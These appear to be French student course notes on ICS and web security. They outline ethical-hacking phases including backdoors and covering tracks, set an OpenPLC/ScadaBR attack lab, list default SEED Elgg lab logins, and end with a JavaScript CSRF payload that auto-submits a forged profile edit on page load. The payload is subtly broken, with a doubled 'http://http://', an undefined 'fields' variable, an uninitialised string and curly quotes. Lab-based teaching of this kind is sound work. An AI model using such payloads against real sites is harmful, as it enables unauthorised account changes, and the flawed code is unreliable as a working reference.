---
title: Sécurité ICS
description: Cours de sécurité ICS
---

!!! info "Prof"
    - Azzeddine RAMRAMI
    - ENSTA / IP
    - [azzeddine.ramrami@owasp.org](mailto:azzeddine.ramrami@owasp.org)

Mieux que Hack the Box: [seedsecuritylabs.org](https://seedsecuritylabs.org)

Certif SANS: [SANS.org](https://www.sans.org/cyber-security-courses/advanced-exploit-development-penetration-testers/)

Pour utiliser Wireshark sur un switch, il faut mettre son port en mode SPAN pour que tout le traffic soit mirror dessus. 

## Ethical hacking

### Méthodes

- CEH v12 
- CPTE Mile2
- CPTS
- OSTMM

Toutes ses méthodes ont 3 phases:

- Information gathering
    - 3 phases de préattaque (?)
        - Information Gathering
            - Google Dork
            - OSINIT
            - whois
            - Données publiqus et réseaux sociaux
                - fingerprinting
                - footprinting
        - Detecting live system
            - Targets:
                - IP, plage IP, Site web, PLC, RTU etc
                - Protooles: IP, IoT (Zigbee, Sigfox, Lora etc), Modbus, TCP/IP
            - Scanning
                - nmap
                - hping3
                - Versions des OS et software
            - Enumeration:
                - shares
                - passwords
    - 1 phase de Vulnerability Assessment
        - Confirmation des CVE et CWE trouvés 
- Exploitation
    - Option 1: NOk (On n'arrive a rien à part un DOS ou DDOS)
    - Option 2: Ok
- Post-exploitation
    - Maintaining access (Backdoor (C&C ([Control & Command](https://www.varonis.com/blog/what-is-c2))), pivoting ...)
    - Cover your tracks (Logs read by SIEM, File Integrity Monitoring (FIM)(Ex: Tripwire) etc)

### Principaux DLL

- kernel32
- advapi
- user32
- ntdll
- wsock32
- ws2_32
- netapi32

## Devoir 1

!!! info "A rendre avant le 10 par email"
    Ecrire un rapport qui répond aux tâches indiquées avec des captures d'écran

### 1 - Lab ICS

#### Requis

- OpenPLC avec ScadaBR (HMI)
    - La config se fait dans Scada 
- OpenPLC - Factory IO (PLC)
    - OpenPLC: master
    - Factory IO: Server

#### Travail

##### PLC -> Factory IO

- Prendre la scène 4 dans Factory IO
- Configurer la scène avec un serveur Modbus TCP avec inputs, coils et registers comme nécessaire
- Créer le programme pour faire tourner l'usine (comme on veut)
- Simuler / debugger / uploader le programme et vérifier que tout fonctionne

##### HMI -> PLC

- Lancer ScadaBR (`dhcclient` mais on a assez de compétences pour ca :smile:)
- Configurer pour se connecter a l'OpenPLC
- Créer une HMI pour la scène (libre)
- Vérifier que lorsque Factory IO est en mode RUN, la HMI récupère les états de chaque Input et Coil
- Réaliser des attaques sur OpenPLC et HMI(Injection, DOS etc)

## OWASP top 10 & AppSec

Formule de risque simplifiée: Risque = Impact * AssetValue<br>
Mais aussi: Risque = Vunérabilité, attaque, surface d'attaque, exploit

[Logiciel de hijack de Java](https://github.com/yehgdotnet/JHijack)

## Devoir 2

[https://seedsecuritylabs.org/Labs_20.04/Web/](Labs)

```sh
// Aliases for the Compose commands above
dcbuild # Alias for: docker-compose build
dcup # Alias for: docker-compose up
dcdown # Alias for: docker-compose down
dockps
docksh <n° recu a la commande précédente> # Il suffit d'entrer les caractères qui le rendent unique
```

Logins Elgg:

UserName | Password
---|---
admin | seedelgg
alice | seedalice
boby | seedboby
charlie | seedcharlie
samy | seedsamy

```js

// Fonction qui crée et envoie le formulaire POST
function contrefacon()
{
    // Contient tous les champs a passer en POST
    var champs;

    champs += "<input type=’hidden’ name=’name’ value=’Alice’>"; // Nom de l'utilisateur
    champs += "<input type=’hidden’ name=’briefdescription’ value=’Samy is my Hero’>"; // Description
    champs += "<input type=’hidden’ name=’accesslevel[briefdescription]’ value=’2’>"; // Visibilité de la description
    champs += "<input type=’hidden’ name=’guid’ value=’56’>"; //Identifiant de l'utilisateur sur le site

    // Formulaire
    var formulaire = document.createElement("form");

    formulaire.action = "http://http://www.seed-server.com/profile/edit/";
    formulaire.innerHTML = fields;
    formulaire.method = "post";

    // Ajouter le formulaire a la page existante
    document.body.appendChild(formulaire);

    // Envoi du formulaire
    formulaire.submit();
}

// Invocation de la contrefacon quand la page se charge
window.onload = function() { contrefacon();}
```
